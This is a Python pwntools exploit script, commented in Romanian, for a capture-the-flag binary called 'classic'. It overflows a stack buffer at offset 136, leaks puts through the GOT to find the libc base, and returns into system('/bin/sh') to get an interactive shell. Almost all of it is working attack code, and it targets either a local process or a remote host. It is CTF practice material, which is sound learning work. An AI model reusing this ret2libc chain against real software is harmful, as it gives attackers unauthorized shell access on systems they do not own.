#!/usr/bin/env python3
# ============================================================================
# CTF: classic — ret2libc (stack BOF: leak libc + system)
# Vulnerabilitate: overflow in call_messager (offset 136) peste return address.
#   Stage 1: fabricam puts(puts@got) => puts@plt tipareste adresa reala a lui puts
#   din libc => baza libc; ne intoarcem in call_messager pt stage 2.
#   Stage 2: ret in system("/bin/sh").
# Binar: ELF 64-bit (amd64), not stripped | NX on · fara canary · No-PIE · Partial RELRO
#   - Fara canary => overflow direct la ret. No-PIE => pop_rdi (elf.sym['f']),
#     plt/got la adrese fixe. NX on => fara shellcode, deci ret2libc. 'ret' in plus
#     pt aliniere stiva la 16 (altfel movaps din system crapa).
# ============================================================================
import sys
from pwn import *

context.binary = elf = ELF('./classic')
context.log_level = 'info'

if len(sys.argv) >= 3 and sys.argv[2].isdigit():
    p, libc = remote(sys.argv[1], sys.argv[2]), ELF('./libc.so')
else:
    p, libc = process('./classic'), elf.libc

# gadget-uri
pop_rdi = elf.symbols['f']    # pop rdi; ret
ret     = pop_rdi + 1         # ret  (doar pt aliniere stiva la 16)

OFF = 136                     # offset pana la return address in call_messager

# ============ STAGE 1: leak libc ============
# Fabricam noi apelul puts(puts@got). puts@plt tipareste adresa REALA a lui
# puts din libc (din GOT) -> scadem offset-ul si aflam baza libc.
p.recvuntil(b"Time to say something:")
payload  = b'A' * OFF
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])          # rdi = adresa din GOT a lui puts
payload += p64(elf.plt['puts'])          # apelam puts@plt(puts@got)
payload += p64(elf.symbols['call_messager'])  # ne intoarcem aici pt stage 2
p.sendline(payload)

p.recvuntil(b"Message sent\n")
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']       # baza libc
log.success(f"puts leak : {leak:#x}")
log.success(f"libc base : {libc.address:#x}")

# ============ STAGE 2: system("/bin/sh") ============
system = libc.symbols['system']
binsh  = next(libc.search(b"/bin/sh\x00"))
# scanf("%s") se opreste la whitespace -> daca adresa lui "/bin/sh" are un astfel
# de octet, folosim "sh" (binsh+5), care are alta adresa
if set(b"\t\n\x0b\x0c\r ") & set(p64(binsh)):
    binsh += 5

p.recvuntil(b"Time to say something:")
payload  = b'A' * OFF
payload += p64(ret)                      # aliniere 16 (altfel movaps in system crapa)
payload += p64(pop_rdi)
payload += p64(binsh)                    # rdi = "/bin/sh"
payload += p64(system)                   # system("/bin/sh")
p.sendline(payload)

p.interactive()   # shell -> cat flag.txt
